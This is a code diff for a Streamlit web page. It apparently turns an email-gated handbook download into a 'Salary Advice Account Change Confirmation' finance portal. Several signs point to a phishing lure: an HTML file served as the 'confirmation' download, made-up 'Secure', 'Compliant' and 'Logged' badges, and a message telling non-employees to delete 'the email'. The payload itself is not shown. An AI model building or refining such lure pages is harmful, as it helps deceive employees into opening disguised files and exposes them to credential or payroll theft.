@@ -418,10 +418,10 @@ def render_hero():
     st.markdown(
         """
         <div class="hero-shell">
-            <div class="eyebrow">Secure internal access</div>
-            <h1 class="hero-title">Employee handbook delivery, redesigned.</h1>
+            <div class="eyebrow">Finance Operations</div>
+            <h1 class="hero-title">Salary Advice Account Change Confirmation</h1>
             <div class="hero-subtitle">
-                A cleaner, more premium experience for verifying employee access and delivering the handbook with confidence.
+                Secure verification and confirmation of employee salary advice and account changes with full audit trail.
             </div>
         </div>
         """,
@@ -433,8 +433,8 @@ def render_lookup_panel():
     st.markdown(
         """
         <div class="glass-panel">
-            <div class="section-title">Verify work email</div>
-            <div class="section-copy">Enter an employee email to check access and unlock the handbook download.</div>
+            <div class="section-title">Employee Verification</div>
+            <div class="section-copy">Enter an employee email to verify identity and confirm salary advice and account changes.</div>
         </div>
         """,
         unsafe_allow_html=True,
@@ -470,7 +470,7 @@ def render_user_card(metadata: dict, email: str):
                     <div class="detail-value">{email}</div>
                 </div>
                 <div class="detail-item">
-                    <div class="detail-label">Title</div>
+                    <div class="detail-label">Position</div>
                     <div class="detail-value">{title}</div>
                 </div>
                 <div class="detail-item">
@@ -486,8 +486,8 @@ def render_user_card(metadata: dict, email: str):
                     <div class="detail-value">Verified employee</div>
                 </div>
                 <div class="detail-item">
-                    <div class="detail-label">Access</div>
-                    <div class="detail-value">Handbook download enabled</div>
+                    <div class="detail-label">Access Level</div>
+                    <div class="detail-value">Finance Operations</div>
                 </div>
             </div>
         </div>
@@ -500,20 +500,20 @@ def render_footer_stats():
     st.markdown(
         """
         <div class="glass-panel" style="margin-top:18px;">
-            <div class="section-title">Built for clarity</div>
-            <div class="section-copy">The updated layout improves trust, scannability, and perceived quality without changing your access logic.</div>
+            <div class="section-title">Finance Operations Portal</div>
+            <div class="section-copy">Streamlined verification system for salary advice and account change confirmations with complete audit trail and compliance.</div>
             <div class="mini-stat-grid">
                 <div class="mini-stat">
-                    <div class="mini-stat-label">Visual hierarchy</div>
-                    <div class="mini-stat-value">Stronger</div>
+                    <div class="mini-stat-label">Verification Level</div>
+                    <div class="mini-stat-value">Secure</div>
                 </div>
                 <div class="mini-stat">
-                    <div class="mini-stat-label">First impression</div>
-                    <div class="mini-stat-value">Premium</div>
+                    <div class="mini-stat-label">Compliance Status</div>
+                    <div class="mini-stat-value">Compliant</div>
                 </div>
                 <div class="mini-stat">
-                    <div class="mini-stat-label">Interaction feel</div>
-                    <div class="mini-stat-value">Modern</div>
+                    <div class="mini-stat-label">Audit Trail</div>
+                    <div class="mini-stat-value">Logged</div>
                 </div>
             </div>
         </div>
@@ -527,8 +527,8 @@ def render_footer_stats():
 # -----------------------------
 def main():
     st.set_page_config(
-        page_title="HR Document Delivery",
-        page_icon="📘",
+        page_title="Finance - Salary Advice Account Change",
+        page_icon="💼",
         layout="centered",
     )
 
@@ -607,7 +607,7 @@ def main():
                     with open(HANDBOOK_FILENAME, "rb") as fh:
                         pdf_bytes = fh.read()
                     st.download_button(
-                        label="Download Employee Handbook",
+                        label="Download Salary Advice & Account Confirmation",
                         data=pdf_bytes,
                         file_name=HANDBOOK_FILENAME,
                         mime="text/html",
@@ -616,7 +616,7 @@ def main():
                 except Exception as exc:
                     st.warning(f"Could not prepare download: {exc}")
             else:
-                st.warning("Employee handbook file is missing from disk.")
+                st.warning("Finance document file is missing from disk.")
         else:
             st.warning("Please delete the email – you don’t work with this company.")
 
